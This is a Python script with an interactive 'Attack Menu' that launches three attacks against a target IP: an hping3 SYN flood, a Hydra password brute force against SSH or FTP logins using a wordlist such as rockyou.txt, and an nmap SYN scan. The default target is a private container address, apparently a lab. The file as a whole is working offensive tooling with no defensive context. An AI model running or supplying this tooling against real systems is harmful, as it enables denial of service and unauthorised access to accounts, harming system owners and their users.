import subprocess
import os
import time

def dosAttack(targetIP, targetPort):
    print(f"[+] Launching hping3 flood against {targetIP}:{targetPort}...")
    # hping3 needs strings in the list. targetPort must be converted.
    cmd = ["hping3", "-S", "-p", str(targetPort), "--flood", targetIP]
    try:
        # Popen runs in the background. 
        # Note: This will run forever until you close the terminal or kill the PID.
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[!] Attack running in background. PID: {process.pid}")
        time.sleep(10)
        process.terminate()
        print(f"[+] Attack stopped after 10 seconds.")
        return process
    except Exception as e:
        print(f"Error: {e}")

def bruteForce(targetIP, targetPort, username, password_file):
    print(f"[+] Starting Hydra brute force on {targetIP}:{targetPort}...")
    
    # Determine protocol based on port
    protocol = "ssh" if int(targetPort) == 22 else "ftp"
    
    # Hydra command: -L for user list OR -l for single user. 
    # Since 'username' here is likely a single string, we use -l
    cmd = ["hydra", "-l", username, "-P", password_file, "-f", targetIP, "-s", str(targetPort), protocol]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error running Hydra: {e}")

def portScanner(targetIP, maxPort):
    print(f"[+] Scanning {targetIP} up to port {maxPort}...")
    # Fixed the f-string and variable name
    cmd = ["nmap", "-sS", "-p", f"1-{maxPort}", targetIP]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error running Nmap: {e}")

def main():
    while True:
        print("\n==== Attack Menu ====")
        print("1. Exit")
        print("2. DOS Attack (hping3)")
        print("3. Port Scanning (nmap)")
        print("4. Brute Force (hydra)")
        
        choice = input("Enter your choice: ").strip()

        if choice == "1":
            print("Exiting...")
            break

        elif choice == "2":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            targetPort = input("Enter target Port: ") or "80"
            dosAttack(targetIP, targetPort)

        elif choice == "3":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            max_port = input("Scan ports from 1 to (default 100): ") or "100"
            portScanner(targetIP, max_port)

        elif choice == "4":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            targetPort = input("Enter target Port (22/21): ") or "22"
            user = input("Enter username: ") or "root"
            wordlist = input("Enter path to wordlist: ") or "rockyou.txt"
            bruteForce(targetIP, targetPort, user, wordlist)

        else:
            print("Invalid choice.")

if __name__ == "__main__":
    main()
